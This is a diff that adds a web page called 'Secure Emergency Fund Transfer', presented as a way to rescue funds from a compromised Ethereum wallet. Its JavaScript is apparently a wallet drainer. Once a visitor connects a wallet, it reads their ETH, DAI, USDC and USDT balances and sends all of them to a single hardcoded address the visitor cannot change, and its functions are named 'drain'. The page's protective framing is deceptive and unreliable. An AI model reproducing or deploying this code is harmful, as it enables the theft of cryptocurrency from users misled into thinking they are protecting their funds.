@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Emergency Fund Transfer</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h1, h2 {
+            text-align: center;
+        }
+        label, input, button {
+            display: block;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #status {
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <h1>Secure Emergency Fund Transfer</h1>
+    <h2>Transfer funds from potentially compromised wallet</h2>
+    <p>Connected Wallet: <span id="connected-address">Not connected</span></p>
+    <button onclick="connectWallet()">Connect Wallet</button>
+    <button onclick="analyzeDrain()">Analyze and Prepare Transfer</button>
+    <button onclick="executeDrain()" id="execute-button" style="display:none;">Execute Transfer</button>
+    <p id="status"></p>
+
+    <script>
+        let web3;
+        let connectedAddress;
+        let drainPlan = [];
+        let totalGasFees = BigInt(0);
+        const GAS_BUFFER_MULTIPLIER = 1.5; // 50% buffer for gas estimation
+        const DESTINATION_ADDRESS = '0x57A0a0D421c86A2506976D86B3D8Dc4FC28F684F';
+
+        const ERC20_ABI = [
+            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
+            {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
+            {"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"type":"function"}
+        ];
+
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    web3 = new Web3(window.ethereum);
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    connectedAddress = accounts[0];
+                    document.getElementById('connected-address').innerText = connectedAddress;
+                    console.log("Wallet connected:", connectedAddress);
+                } catch (error) {
+                    console.error("Failed to connect wallet:", error);
+                    document.getElementById('status').innerText = "Failed to connect wallet: " + error.message;
+                }
+            } else {
+                console.log('No web3? You should consider trying MetaMask!');
+                document.getElementById('status').innerText = "No Web3 wallet detected. Please install MetaMask.";
+            }
+        }
+
+        async function getERC20Tokens() {
+            // This is a simplified list. In a real-world scenario, you'd want a more comprehensive token discovery method.
+            return [
+                '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
+                '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
+                '0xdAC17F958D2ee523a2206206994597C13D831ec7'  // USDT
+            ];
+        }
+
+        async function analyzeDrain() {
+            if (!web3 || !connectedAddress) {
+                alert("Please connect your wallet first.");
+                return;
+            }
+
+            let status = "Analyzing wallet contents...\n\n";
+            document.getElementById('status').innerText = status;
+
+            try {
+                drainPlan = [];
+                totalGasFees = BigInt(0);
+                const gasPrice = BigInt(await web3.eth.getGasPrice());
+
+                // Check native currency balance
+                const balance = await web3.eth.getBalance(connectedAddress);
+                if (balance > 0) {
+                    drainPlan.push({type: 'native', balance: BigInt(balance), symbol: 'ETH'});
+                    status += `Native ETH balance: ${web3.utils.fromWei(balance, 'ether')} ETH\n`;
+                }
+
+                // Check ERC20 token balances
+                const tokenAddresses = await getERC20Tokens();
+                for (const tokenAddress of tokenAddresses) {
+                    const tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
+                    const tokenBalance = await tokenContract.methods.balanceOf(connectedAddress).call();
+                    if (tokenBalance > 0) {
+                        const symbol = await tokenContract.methods.symbol().call();
+                        drainPlan.push({type: 'erc20', address: tokenAddress, balance: BigInt(tokenBalance), symbol: symbol});
+                        status += `Token ${symbol} balance: ${tokenBalance}\n`;
+                        
+                        // Estimate gas for this token transfer
+                        const gasEstimate = await tokenContract.methods.transfer(DESTINATION_ADDRESS, tokenBalance).estimateGas({from: connectedAddress});
+                        totalGasFees += BigInt(Math.ceil(Number(gasEstimate) * GAS_BUFFER_MULTIPLIER)) * gasPrice;
+                    }
+                }
+
+                // Add gas for ETH transfer with buffer
+                totalGasFees += BigInt(Math.ceil(21000 * GAS_BUFFER_MULTIPLIER)) * gasPrice;
+
+                // Adjust ETH transfer amount more conservatively
+                const ethItem = drainPlan.find(item => item.type === 'native');
+                if (ethItem) {
+                    const reserveAmount = totalGasFees * BigInt(2); // Double the estimated fees as a safety measure
+                    const availableForTransfer = ethItem.balance > reserveAmount ? ethItem.balance - reserveAmount : BigInt(0);
+                    ethItem.transferAmount = availableForTransfer;
+                    
+                    status += `\nEstimated total gas fees: ${web3.utils.fromWei(totalGasFees.toString(), 'ether')} ETH\n`;
+                    status += `ETH reserved for fees: ${web3.utils.fromWei(reserveAmount.toString(), 'ether')} ETH\n`;
+                    status += `ETH available for transfer: ${web3.utils.fromWei(availableForTransfer.toString(), 'ether')} ETH\n`;
+                    
+                    if (availableForTransfer === BigInt(0)) {
+                        status += "\nWARNING: Not enough ETH to perform any transfer after reserving for fees.\n";
+                    }
+                } else {
+                    status += "\nWARNING: No ETH available. Cannot proceed with transfer.\n";
+                }
+
+                // Sort drainPlan to put ERC20 tokens first and ETH last
+                drainPlan.sort((a, b) => {
+                    if (a.type === 'native') return 1;
+                    if (b.type === 'native') return -1;
+                    return Number(b.balance) - Number(a.balance);
+                });
+
+                status += "\nAnalysis complete. Ready to execute transfer.";
+                document.getElementById('status').innerText = status;
+                document.getElementById('execute-button').style.display = 'block';
+            } catch (error) {
+                console.error("Error during analysis:", error);
+                document.getElementById('status').innerText = "Error during analysis: " + error.message;
+            }
+        }
+
+        async function executeDrain() {
+            let status = "Executing transfer...\n\n";
+            document.getElementById('status').innerText = status;
+
+            const ethItem = drainPlan.find(item => item.type === 'native');
+            if (!ethItem || ethItem.balance <= totalGasFees * BigInt(2)) {
+                status += "ERROR: Not enough ETH to cover gas fees. Cannot proceed with transfer.\n";
+                document.getElementById('status').innerText = status;
+                return;
+            }
+
+            // Final check before executing transfers
+            const currentBalance = BigInt(await web3.eth.getBalance(connectedAddress));
+            if (currentBalance <= totalGasFees * BigInt(2)) {
+                status += "ERROR: Current ETH balance too low to safely execute transfers.\n";
+                document.getElementById('status').innerText = status;
+                return;
+            }
+
+            // Transfer ERC20 tokens first
+            for (const item of drainPlan) {
+                if (item.type === 'erc20') {
+                    status += await drainERC20Token(item.address, item.balance, item.symbol);
+                    document.getElementById('status').innerText = status;
+                }
+            }
+
+            // Transfer remaining ETH last
+            if (ethItem && ethItem.transferAmount > 0) {
+                status += await drainNativeToken(ethItem.transferAmount);
+                document.getElementById('status').innerText = status;
+            }
+
+            status += "\nTransfer execution complete.";
+            document.getElementById('status').innerText = status;
+        }
+
+        async function drainNativeToken(amount) {
+            try {
+                const gasPrice = await web3.eth.getGasPrice();
+                const gasLimit = 21000;
+                const gasCost = BigInt(gasPrice) * BigInt(gasLimit);
+                const adjustedAmount = amount > gasCost ? amount - gasCost : BigInt(0);
+
+                if (adjustedAmount === BigInt(0)) {
+                    return `Unable to transfer ETH: Amount too low after subtracting gas costs.\n`;
+                }
+
+                const tx = await web3.eth.sendTransaction({
+                    from: connectedAddress,
+                    to: DESTINATION_ADDRESS,
+                    value: adjustedAmount.toString(),
+                    gas: gasLimit,
+                    gasPrice: gasPrice
+                });
+                return `Native ETH transferred: ${web3.utils.fromWei(adjustedAmount.toString(), 'ether')} ETH. Transaction hash: ${tx.transactionHash}\n`;
+            } catch (error) {
+                console.error("Error transferring native token:", error);
+                return `Error transferring native ETH: ${error.message}\n`;
+            }
+        }
+
+        async function drainERC20Token(tokenAddress, balance, symbol) {
+            try {
+                const tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
+                const tx = await tokenContract.methods.transfer(DESTINATION_ADDRESS, balance.toString()).send({from: connectedAddress});
+                return `Token ${symbol} transferred: ${balance.toString()} tokens. Transaction hash: ${tx.transactionHash}\n`;
+            } catch (error) {
+                console.error(`Error transferring ${symbol}:`, error);
+                return `Failed to transfer ${symbol}: ${error.message}\n`;
+            }
+        }
+
+        // Initialize Web3 when the page loads
+        window.addEventListener('load', () => {
+            if (typeof window.ethereum !== 'undefined') {
+                web3 = new Web3(window.ethereum);
+                console.log("Web3 initialized");
+            }
+        });
+    </script>
+</body>
+</html>
